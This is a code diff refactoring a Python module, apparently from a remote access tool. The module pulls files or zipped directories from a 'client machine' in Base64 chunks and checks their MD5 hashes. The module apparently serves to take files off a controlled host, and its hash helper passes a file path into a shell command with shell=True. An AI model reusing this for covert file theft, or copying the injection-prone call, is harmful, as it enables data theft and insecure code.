@@ -1,30 +1,33 @@
+from modules.helpers import ModuleABC
 import os
 import subprocess
 import re
 
 
-class Module:
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.download_file = None
+        self.output_folder = None
+        self.buffer_size = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Download a file or directory from the client.",
             "References": [],
             "Task": True
         }
-        self.download_file = None
-        self.output_folder = None
-        self.buffer_size = None
 
-    def setup(self, module_view, output_view, successful):
-        self.download_file = module_view.prompt("Path to file or directory on client machine: ")
-        self.output_folder = os.path.expanduser(module_view.prompt("Local output folder (ENTER for output/): "))
-        self.buffer_size = module_view.prompt("Buffer size (ENTER for 4096 bytes): ")
+    def setup(self, module_input, view, successful):
+        self.download_file = module_input.prompt("Path to file or directory on client machine: ")
+        self.output_folder = os.path.expanduser(module_input.prompt("Local output folder (ENTER for output/): "))
+        self.buffer_size = module_input.prompt("Buffer size (ENTER for 4096 bytes): ")
 
         # Set default variables.
         if not self.buffer_size:
             self.buffer_size = 4096
         if type(self.buffer_size) is not int:
-            output_view.add("Invalid buffer size, using 4096.", "info")
+            view.output("Invalid buffer size, using 4096.", "info")
             self.buffer_size = 4096
         if not self.output_folder:
             self.output_folder = "output"
@@ -33,10 +36,10 @@ class Module:
                 os.mkdir("output")
 
         if os.path.exists(os.path.join(self.output_folder, os.path.basename(self.download_file))):
-            output_view.add("A file with that name already exists!", "attention")
+            view.output("A file with that name already exists!", "attention")
             successful.put(False)
         elif not os.path.exists(self.output_folder):
-            output_view.add("Output folder doesn't exist!", "attention")
+            view.output("Output folder doesn't exist!", "attention")
             successful.put(False)
         else:
             successful.put(True)
@@ -90,36 +93,39 @@ class Module:
                 send_response("Finished.", "download")
         """ % (self.download_file, self.buffer_size)
 
-    def process_response(self, output_view, response):
+    def process_response(self, response: bytes, view):
         # Files are sent back to us in small pieces (encoded with Base64),
         # we simply decode these pieces and write them to the output file.
         output_name = os.path.basename(self.download_file)
         output_file = os.path.join(self.output_folder, output_name)
 
-        if "Failed to download" in response:
-            output_view.add(response, "attention")
-        elif "Compressing directory" in response:
-            output_view.add(response, "info")
-        elif "Stopped" in response:
-            output_view.add(response, "info")
-        elif "Started" in response:
-            file_type = response.split(":")[1].lower()
-            md5_hash = response.split(":")[2]
+        str_response = response.decode()
+
+        if "Failed to download" in str_response:
+            view.output(str_response, "attention")
+        elif "Compressing directory" in str_response:
+            view.output(str_response, "info")
+        elif "Stopped" in str_response:
+            view.output(str_response, "info")
+        elif "Started" in str_response:
+            file_type = str_response.split(":")[1].lower()
+            md5_hash = str_response.split(":")[2]
 
             if file_type == "directory":
                 # Updates the output name for the next request.
                 self.download_file = self.download_file + ".zip"
 
-            output_view.add("Started downloading: \"%s\"..." % output_name)
-            output_view.add("Remote MD5 file hash: %s" % md5_hash)
-        elif "Finished" in response:
-            output_view.add("Local MD5 file hash (should match): %s" % self.get_file_hash(output_file))
-            output_view.add("Finished file download, saved to: %s" % output_file)
+            view.output("Started downloading: \"{}\"...".format(output_name))
+            view.output("Remote MD5 file hash: {}".format(md5_hash))
+        elif "Finished" in str_response:
+            view.output("Local MD5 file hash (should match): {}".format(self._get_file_hash(output_file)))
+            view.output("Finished file download, saved to: {}".format(output_file))
         else:
-            with open(output_file, "a") as output_file:
+            with open(output_file, "ab") as output_file:
                 output_file.write(response)
 
-    def get_file_hash(self, file_path):
+    @staticmethod
+    def _get_file_hash(file_path):
         md5_programs = ["md5sum", "md5"]  # Tested on Linux and Mac (lol @ Windows)
 
         for program in md5_programs:
@@ -127,6 +133,7 @@ class Module:
                 hash_command = program + " " + os.path.realpath(file_path)
                 process = subprocess.Popen(hash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
+                # MD5 regex for the win.
                 return re.findall(r"([a-fA-F\d]{32})", (process.stdout.readline() + process.stderr.readline()))[0]
             except IndexError:
                 continue
